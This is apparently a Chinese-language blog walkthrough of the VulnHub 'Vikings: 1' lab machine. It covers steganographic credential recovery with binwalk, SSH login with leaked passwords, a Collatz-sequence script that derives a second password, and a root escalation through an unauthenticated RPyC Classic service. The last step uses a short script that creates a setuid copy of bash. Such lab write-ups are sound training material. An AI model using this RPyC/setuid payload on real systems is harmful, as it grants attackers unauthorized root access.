---
title: VulnHub Vikings：1
date: 2026-06-10 18:41:00
categories: 
  - VulnHub
tags:
  - Binwalk
  - 弱口令
  - Python 升级为交互式 Shell
  - RPyC Classic 提权
---

# Vikings：1

项目地址：https://download.vulnhub.com/vikings/Vikings.ova

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a2a550a6dfdab59f4299d91.png)

## CTF

### Binwalk

访问首页

![](https://pic1.imgdb.cn/item/6a2a55666dfdab59f4299d99.png)

扫描目录有个 `war.txt` 文件，访问是一个路径

![](https://pic1.imgdb.cn/item/6a2a55e66dfdab59f4299f34.png)

拼接在后面访问是很大段编码

![](https://pic1.imgdb.cn/item/6a2a56156dfdab59f4299ffd.png)

解码是一个压缩文件

![](https://pic1.imgdb.cn/item/6a2a564a6dfdab59f429a05d.png)

但是要求输入密码

![](https://pic1.imgdb.cn/item/6a2a566c6dfdab59f429a103.png)

破解出来是 `ragnarok123`，得到一张图片

用 Binwalk 识别出里面的压缩包

![](https://pic1.imgdb.cn/item/6a2a56dc6dfdab59f429a285.png)

加上 `-e` 参数解压缩出来

![](https://pic1.imgdb.cn/item/6a2a573a6dfdab59f429a35e.png)

查看文件拿到用户名密码

```
floki:f@m0usboatbuilde7
```

![](https://pic1.imgdb.cn/item/6a2a57916dfdab59f429a416.png)

## 弱口令

### SSH

成功登录

![](https://pic1.imgdb.cn/item/6a2a57e06dfdab59f429a5b1.png)

查看文件内容

```
我是著名的造船师弗洛基（Floki）。我们曾倾尽全力劫掠巴黎，却最终失败。战后我们不知拉格纳（Ragnar）的去向，他此刻正陷入极度的悲痛。
我需要向他道歉——因为率领所有维京人作战的正是我。我必须找到他，他可能在任何地方。
我需要打造这艘 boat（船），去寻回拉格纳
```

![](https://pic1.imgdb.cn/item/6a2a59926dfdab59f429a965.png)

下面的 `boat` 文件的翻译内容

```
Printable chars are your ally.

可打印字符是可靠的操作对象

collatz-conjecture(num)

调用考拉兹猜想（Collatz Conjecture） 算法，以 num=109 为输入
```

```python
def collatz(x):
    """生成Collatz序列（仅包含≤255的值）"""
    result = [x]  # 修复：应从输入值x开始，而非固定109
    while x != 1:
        if x % 2 == 1:
            x = 3 * x + 1
        else:
            x = x // 2  # 使用整数除法避免浮点数
        if x <= 255:
            result.append(x)
    return result

def to_ascii(numbers):
    """将数字列表转换为ASCII字符串（不可见字符用●表示）"""
    ascii_str = ""
    for num in numbers:
        if 32 <= num <= 126:  # 可打印ASCII字符范围
            ascii_str += chr(num)
        else:  # 控制字符/扩展ASCII用符号替代
            ascii_str += "●"
    return ascii_str

# 测试执行
if __name__ == "__main__":
    start_num = 109
    sequence = collatz(start_num)
    
    print(f"Collatz序列（从{start_num}开始）:")
    print(sequence)
    
    ascii_result = to_ascii(sequence)
    print(f"\n转换为ASCII字符串（●表示不可见字符）:")
    print(ascii_result)
    
    # 附加说明
    print(f"\n注：序列共{len(sequence)}个≤255的值，"
          f"其中{sum(32 <= n <= 126 for n in sequence)}个是可打印字符")
```

得到 `mR)|>^/Gky[gz=\.F#j5P(`，应该是 ragnar 用户的密码，直接登录

![](https://pic1.imgdb.cn/item/6a2a60256dfdab59f429f099.png)

## 提权

### Python 升级为交互式 Shell

![](https://pic1.imgdb.cn/item/6a2a60486dfdab59f429f09b.png)

### RPyC Classic 提权

在家目录中发现 `.profile` 文件

![](https://pic1.imgdb.cn/item/6a2a60796dfdab59f429f0bf.png)

代码中的 `sudo python3 /usr/local/bin/rpyc_classic.py` 会以 root 权限启动 RPyC Classic 服务

该服务默认监听所有网络接口的 18812 端口，并提供完全无认证的远程 Python 解释器访问权限

攻击者可直接连接该端口执行任意系统命令

```python
import rpyc
con = rpyc.classic.connect('localhost')
def getshell():
        import os
        os.system('cp /bin/bash /tmp/root && chmod +s /tmp/root')
 
shell = con.teleport(getshell)
shell()
```

![](https://pic1.imgdb.cn/item/6a2a6a806dfdab59f42a08cc.png)